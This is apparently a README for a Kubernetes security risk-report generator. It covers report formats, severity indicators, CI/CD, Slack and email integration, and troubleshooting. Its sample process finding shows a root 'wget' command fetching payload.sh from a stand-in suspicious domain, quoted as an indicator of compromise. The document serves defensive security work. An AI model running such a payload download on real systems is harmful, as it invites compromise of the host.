# Human-Readable Reports

## Overview

The RHACS Risk Prioritization system generates both machine-readable JSON and human-readable text reports. The human-readable reports use visual indicators, clear language, and categorized findings to help security teams quickly understand and act on risk analysis results.

## Report Types

### 1. Executive Summary
High-level overview for management and leadership.

**Includes:**
- Deployment identification
- Overall risk priority with visual severity (🔴/🟠/🟡/🟢)
- Risk assessment explanation
- Key statistics
- Top recommendations

**Best for:** Daily standups, leadership briefings, quick triage

### 2. Detailed Vulnerability Report
Comprehensive CVE analysis with exploit maturity.

**Includes:**
- Known exploited CVEs (CISA KEV) - IMMEDIATE ACTION
- Weaponized CVEs (Metasploit) - URGENT
- High-severity CVEs - IMPORTANT
- Exploit maturity indicators
- AI-powered applicability assessments

**Best for:** Security engineers, patch management, vulnerability tracking

### 3. Process Execution Report
Runtime behavior analysis.

**Includes:**
- High-risk processes - CRITICAL
- Medium-risk processes - INVESTIGATE
- Normal processes - INFORMATIONAL
- AI-powered risk classifications
- Detailed explanations

**Best for:** Incident response, anomaly investigation, runtime security

### 4. Actionable Recommendations
Prioritized action items.

**Includes:**
- IMMEDIATE actions (🔴)
- URGENT tasks (🟠)
- IMPORTANT items (🟡)
- General improvements (ℹ️)
- Clear, actionable steps

**Best for:** Sprint planning, remediation tracking, security backlog

## Visual Indicators

### Severity Levels
```
🔴 CRITICAL  - Immediate action required (Score: 90-100)
🟠 HIGH      - Urgent action needed (Score: 70-89)
🟡 MEDIUM    - Important, plan remediation (Score: 50-69)
🟢 LOW       - Standard patching cycle (Score: 0-49)
ℹ️  INFO     - Informational, no immediate action
```

### Exploit Maturity
```
⚠️  ACTIVELY EXPLOITED  - In CISA KEV, real attacks occurring
💣 WEAPONIZED          - Metasploit module available
📝 POC AVAILABLE       - Public proof-of-concept code exists
📖 THEORETICAL         - No known exploits
```

### Process Risk
```
🔴 CRITICAL  - Malicious or highly risky behavior
🟡 MEDIUM    - Suspicious, warrants investigation
🟢 LOW       - Normal, expected behavior
```

## Usage

### Generate Report from JSON

```bash
# After running risk analysis
/rhacs-risk-analysis <deployment-id>

# Generate human-readable report
python3 report_generator.py risk.json

# Output files:
# - risk.json (machine-readable)
# - risk_report.txt (human-readable)
```

### Direct Generation

```bash
# From analysis JSON
python3 report_generator.py final_analysis.json

# View report
cat final_analysis_report.txt

# Or open in editor
less final_analysis_report.txt
```

### Programmatic Usage

```python
from report_generator import ReportGenerator
import json

# Load analysis data
with open('risk.json') as f:
    data = json.load(f)

# Generate report
generator = ReportGenerator(data)

# Full report
full_report = generator.generate_full_report()
print(full_report)

# Or individual sections
exec_summary = generator.generate_executive_summary()
vuln_report = generator.generate_vulnerability_report()
process_report = generator.generate_process_report()
recommendations = generator.generate_recommendations_report()
```

## Example Output

### Executive Summary Example

```
════════════════════════════════════════════════════════════════════════════════
EXECUTIVE SUMMARY
════════════════════════════════════════════════════════════════════════════════

Deployment:  payment-api
Namespace:   production
Cluster:     prod-cluster-us-east
Analysis:    2026-04-09T21:00:00Z

────────────────────────────────────────────────────────────────────────────────
RISK ASSESSMENT
────────────────────────────────────────────────────────────────────────────────

🟠 HIGH Overall Risk Priority: 85/100 (HIGH)
   RHACS Original Score: 68.5

Risk Assessment:
  HIGH priority due to CVE-2021-44228 (Log4Shell) being actively exploited in
  the wild according to CISA KEV. This deployment uses log4j-core 2.14.1 which
  is vulnerable. The service is publicly exposed on port 8080, meeting all
  exploitation prerequisites.

────────────────────────────────────────────────────────────────────────────────
KEY FINDINGS
────────────────────────────────────────────────────────────────────────────────

📦 Vulnerabilities:
   • Total CVEs: 3
   • High Severity (CVSS ≥ 7.0): 3
   ⚠️  ACTIVELY EXPLOITED Known Exploited: 1

⚙️  Processes:
   • Total Processes: 3
   • Flagged as Suspicious: 2

────────────────────────────────────────────────────────────────────────────────
TOP RECOMMENDATIONS
────────────────────────────────────────────────────────────────────────────────

1. URGENT: Update log4j-core to version 2.17.1 or later
2. IMMEDIATE: Investigate wget process execution
3. URGENT: Implement WAF rules to block Log4Shell exploitation
```

### Vulnerability Detail Example

```
────────────────────────────────────────────────────────────────────────────────
⚠️  ACTIVELY EXPLOITED KNOWN EXPLOITED VULNERABILITIES (CISA KEV)
────────────────────────────────────────────────────────────────────────────────

These CVEs are being actively exploited in the wild. IMMEDIATE action required.

🔴 CRITICAL CVE-2021-44228 (CVSS: 10.0)
   Component: log4j-core (2.14.1) → Fix: 2.17.1
   ⚠️  ACTIVELY EXPLOITED (CISA KEV)
      Added: 2021-12-10
      Action: Apply updates OR remove affected assets
   AI Assessment:
      CRITICAL: This CVE is in CISA KEV and is actively exploited in the wild.
      Public PoC code is available. All prerequisites are met in this deployment
      (network accessible, no authentication required). IMMEDIATE remediation
      required - update to log4j-core 2.17.1 or later.
```

### Process Detail Example

```
────────────────────────────────────────────────────────────────────────────────
🔴 CRITICAL HIGH RISK PROCESSES
────────────────────────────────────────────────────────────────────────────────

These processes indicate risky behavior and should be investigated immediately.

🔴 CRITICAL wget
   Container: payment-api
   Command: wget http://suspicious-domain.com/payload.sh
   UID: 0 (root)
   AI Assessment:
      CRITICAL: wget process attempting to download from external domain. This
      is highly suspicious as wget should not be running in a production payment
      API container. Running as root (UID 0) increases the risk. This could be
      an indicator of compromise. Immediate investigation required.
```

### Recommendations Example

```
════════════════════════════════════════════════════════════════════════════════
ACTIONABLE RECOMMENDATIONS
════════════════════════════════════════════════════════════════════════════════

🔴 CRITICAL IMMEDIATE ACTION REQUIRED
────────────────────────────────────────────────────────────────────────────────

1. URGENT: Update log4j-core to version 2.17.1 or later immediately
2. IMMEDIATE: Investigate wget process execution - check application logs
3. URGENT: Implement WAF rules to block Log4Shell exploitation attempts

🟠 HIGH URGENT (Within Days)
────────────────────────────────────────────────────────────────────────────────

1. Scan container image with updated vulnerability scanner after Log4j patch
2. Review and patch related Log4j CVEs (CVE-2022-23305)

🟡 MEDIUM IMPORTANT (Within Weeks)
────────────────────────────────────────────────────────────────────────────────

1. Investigate shell process reading /etc/passwd
2. Review container image build process
3. Review and tighten security context - consider readOnlyRootFilesystem
```

## Integration Examples

### In CI/CD Pipeline

```bash
#!/bin/bash
# ci-cd-security-check.sh

DEPLOYMENT_ID=$1

# Run analysis
python3 rhacs_analyzer.py analyze $DEPLOYMENT_ID --exploits > analysis.json

# Generate human-readable report
python3 report_generator.py analysis.json

# Check for critical issues
CRITICAL_CVES=$(jq '.exploitMaturitySummary.knownExploited' analysis.json)
HIGH_RISK_PROCS=$(jq '[.suspiciousProcessExecutions[] | select(.genAIClassification == "HIGH")] | length' analysis.json)

if [ "$CRITICAL_CVES" -gt 0 ] || [ "$HIGH_RISK_PROCS" -gt 0 ]; then
  echo "❌ SECURITY GATE FAILED"
  echo ""
  cat analysis_report.txt
  exit 1
else
  echo "✅ Security check passed"
  exit 0
fi
```

### Slack Integration

```python
import json
import requests
from report_generator import ReportGenerator

def send_to_slack(webhook_url, analysis_file):
    with open(analysis_file) as f:
        data = json.load(f)
    
    generator = ReportGenerator(data)
    
    # Generate executive summary
    summary = generator.generate_executive_summary()
    
    # Extract key points
    priority = data.get('genAIPriority', 0)
    known_exploited = data.get('exploitMaturitySummary', {}).get('knownExploited', 0)
    
    # Determine color
    if priority >= 90:
        color = "danger"
    elif priority >= 70:
        color = "warning"
    else:
        color = "good"
    
    # Send to Slack
    payload = {
        "attachments": [{
            "color": color,
            "title": f"Risk Analysis: {data.get('deploymentName')}",
            "text": summary,
            "footer": "RHACS Risk Prioritization System"
        }]
    }
    
    requests.post(webhook_url, json=payload)
```

### Email Report

```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from report_generator import ReportGenerator
import json

def email_report(analysis_file, recipients):
    with open(analysis_file) as f:
        data = json.load(f)
    
    generator = ReportGenerator(data)
    report = generator.generate_full_report()
    
    msg = MIMEMultipart()
    msg['Subject'] = f"Security Risk Report: {data.get('deploymentName')}"
    msg['From'] = 'security@company.com'
    msg['To'] = ', '.join(recipients)
    
    # Plain text version
    msg.attach(MIMEText(report, 'plain'))
    
    # Send email
    with smtplib.SMTP('smtp.company.com') as smtp:
        smtp.send_message(msg)
```

### Dashboard Integration

```python
from report_generator import ReportGenerator
import json

def get_dashboard_metrics(analysis_file):
    with open(analysis_file) as f:
        data = json.load(f)
    
    return {
        'deployment': data.get('deploymentName'),
        'risk_score': data.get('genAIPriority', 0),
        'total_cves': len(data.get('imageVulnerabilities', [])),
        'known_exploited': data.get('exploitMaturitySummary', {}).get('knownExploited', 0),
        'weaponized': data.get('exploitMaturitySummary', {}).get('hasMetasploit', 0),
        'high_risk_processes': len([p for p in data.get('suspiciousProcessExecutions', [])
                                     if p.get('genAIClassification') == 'HIGH']),
        'immediate_actions': len([r for r in data.get('recommendations', [])
                                  if 'IMMEDIATE' in r or 'URGENT' in r])
    }
```

## Report Customization

### Filter by Severity

```python
generator = ReportGenerator(data)

# Only show critical/high vulnerabilities
high_severity_vulns = [v for v in data['imageVulnerabilities'] if v.get('cvss', 0) >= 7.0]
filtered_data = {**data, 'imageVulnerabilities': high_severity_vulns}
filtered_generator = ReportGenerator(filtered_data)
report = filtered_generator.generate_vulnerability_report()
```

### Custom Formatting

```python
class CustomReportGenerator(ReportGenerator):
    def generate_executive_summary(self):
        # Override with custom formatting
        summary = super().generate_executive_summary()
        # Add custom branding, logos, etc.
        return f"COMPANY LOGO\n\n{summary}"
```

## Best Practices

### 1. Regular Reporting
- Generate reports daily for production deployments
- Weekly for development/staging
- After any significant changes

### 2. Distribution
- Email critical findings to security team
- Post to Slack/Teams for visibility
- Archive reports for compliance

### 3. Tracking
- Compare reports over time
- Track remediation progress
- Measure time-to-fix for known exploited CVEs

### 4. Integration
- Include in CI/CD pipelines
- Fail builds on known exploited CVEs
- Require sign-off for high-risk deployments

### 5. Communication
- Use executive summary for management
- Full report for security engineers
- Recommendations for development teams

## Troubleshooting

### Report Generation Fails

```bash
# Check JSON validity
jq . risk.json

# Regenerate with verbose output
python3 report_generator.py risk.json -v
```

### Missing Data in Report

Ensure the analysis JSON includes all required fields:
- `genAIPriority`
- `genAIPriorityExplanation`
- `exploitMaturitySummary`
- `imageVulnerabilities` with `exploitMaturity`
- `suspiciousProcessExecutions` with `genAIClassification`

### Formatting Issues

The report is designed for 80-character width terminals. For wider displays:

```python
# Adjust in report_generator.py
def _wrap_text(self, text: str, width: int = 120, indent: int = 0):
    # Change width from 80 to 120
```

## Future Enhancements

Planned features:
- [ ] HTML report generation
- [ ] PDF export
- [ ] Markdown format
- [ ] Charts and graphs
- [ ] Trend analysis over time
- [ ] Comparison between deployments
- [ ] Custom report templates
- [ ] Multi-language support
